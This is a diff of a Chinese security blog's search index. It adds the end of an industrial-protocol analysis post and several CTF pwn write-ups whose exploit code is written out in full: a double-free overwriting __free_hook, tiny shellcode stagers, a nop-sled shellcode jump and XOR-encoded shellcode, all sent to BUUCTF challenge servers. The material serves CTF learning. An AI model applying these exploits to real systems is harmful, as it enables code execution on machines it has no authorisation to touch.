+<tr>
+<td>0xff</td>
+<td>Success</td>
+<td>成功</td>
+</tr>
+</tbody></table>
+<p><code>Transport size</code>  ：数据传输的大小或类型，上面已经介绍过</p>
+<p><code>Length</code>  ：这里的 <code>Length</code> 指的是只有 <code>Data</code> （下面这个字段）的长度，并不是这个 <code>Data</code> 部分的长度</p>
+<p><code>Data</code>  ：需要写入的数据</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/6603?accounttraceid=336501792de944e4807240804083f4f3zheo#toc-2">https://xz.aliyun.com/t/6603?accounttraceid=336501792de944e4807240804083f4f3zheo#toc-2</a></p>
+<p><a href="https://blog.csdn.net/oliver223/article/details/118107094">https://blog.csdn.net/oliver223/article/details/118107094</a></p>
+<p><a href="https://blog.csdn.net/weixin_43158056/article/details/104298156">https://blog.csdn.net/weixin_43158056/article/details/104298156</a></p>
+]]></content>
+      <categories>
+        <category>工控安全</category>
+      </categories>
+      <tags>
+        <tag>工控基础</tag>
+        <tag>协议分析</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>D-Link DIR-815路由器溢出漏洞分析</title>
     <url>/posts/d1f081a9.html</url>
     <content><![CDATA[<p>网上关于 <code>D-Link DIR-815</code> 路由器漏洞复现的文章还是蛮多的，因此第一次的复现选择了这个软柿子🤔。因为相关文章很多的缘故，所以我尽可能来写一些大多文章没有提到的点。</p>
@@ -7314,6 +7937,31 @@
 
 <p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302082210135.png" alt="image-20230208221024944"></p>
 <p>参考文章：<a href="https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/">https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/</a></p>
+<h2 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h2><p>很简单，uaf漏洞，2.27的libc，直接打double free即可</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27530&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1693</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021735950.png" alt="image-20230702173556806"></p>
+<h2 id="rctf-2019-shellcoder"><a href="#rctf-2019-shellcoder" class="headerlink" title="rctf_2019_shellcoder"></a>rctf_2019_shellcoder</h2><p>考察了 <code>shellcode</code> 的编写，只有七个字节输入的机会，然后将其执行。</p>
+<p>我采用的是用 <code>xchg</code> 指令来交换了 <code>rdi</code> 和 <code>rsi</code> 的值，以此来节省了字节数，再次执行系统调用<code>read</code>（同时还采用了 <code>mov edx,esi</code> 指令又节省了一个字节，才凑齐了七个字节）</p>
+<p>这次的 <code>read</code> 可以读入很多字节了，正常打 <code>execve(&quot;/bin/sh\x00&quot;)</code> 的 <code>shellcode</code> 即可</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27174</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x47c</span>,<span class="number">0x4c7</span>)</span><br><span class="line">payload=<span class="string">&quot;\x48\x87\xF7\x89\xF2\x0F\x05&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;hello shellcoder:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov r11,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push r11</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh\x00&quot;,0,0)</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+asm(shellcode)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031458424.png" alt="image-20230703145813242"></p>
+<h2 id="picoctf-2018-gps"><a href="#picoctf-2018-gps" class="headerlink" title="picoctf_2018_gps"></a>picoctf_2018_gps</h2><p>本题是泄露了一个栈地址，然后有一个任意地址执行的机会，因为没开 <code>MX</code> 保护，所以可以直接跳转到 <code>shellcode</code> 上，又因为泄露的地址和执行的位置存在随机化（所以采用 <code>nop</code> 滑行的方式执行到 <code>shellcode</code> 上）</p>
+<p>因为存在随机化的过程，导致了不一定能落在 <code>nop</code> 上，<code>exp</code> 有概率打不通</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>,<span class="string">&quot;node4.buuoj.cn:25715&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x400aaa</span>,<span class="number">0x400a76</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Current position: &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">hex</span>(<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(stack_addr[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x400</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&#x27;s your plan?\n&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Where do we start?\n&gt; &quot;</span>,<span class="built_in">str</span>(stack_addr[<span class="number">2</span>:]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031602132.png" alt="image-20230703160237889"></p>
+<h2 id="tiny-backdoor-v1-hackover-2016"><a href="#tiny-backdoor-v1-hackover-2016" class="headerlink" title="tiny_backdoor_v1_hackover_2016"></a>tiny_backdoor_v1_hackover_2016</h2><p>本题考察的和 <code>rctf_2019_shellcoder</code>  一样，这题是能输入九个字节的 <code>shellcode</code> ，但是加了一个异或加密的过程，只需要反向将其异或解密即可（就是把 <code>shellcode</code> 与要异或的固定值异或一次得到的结果进行发送即可）</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27311</span>)</span><br><span class="line">debug(p,<span class="number">0x400132</span>)</span><br><span class="line"></span><br><span class="line">shellcode=[<span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xD7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>,<span class="number">0x90</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="number">0xB3</span>, <span class="number">0x91</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>, <span class="number">0x62</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x6A</span>, <span class="number">0x90</span>]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode[cnt]^i))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\xfb\x16\xa8\x95\x53\x41\x1e\x6f\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031634544.png" alt="image-20230703163428321"></p>
 ]]></content>
       <categories>
         <category>buu刷题</category>
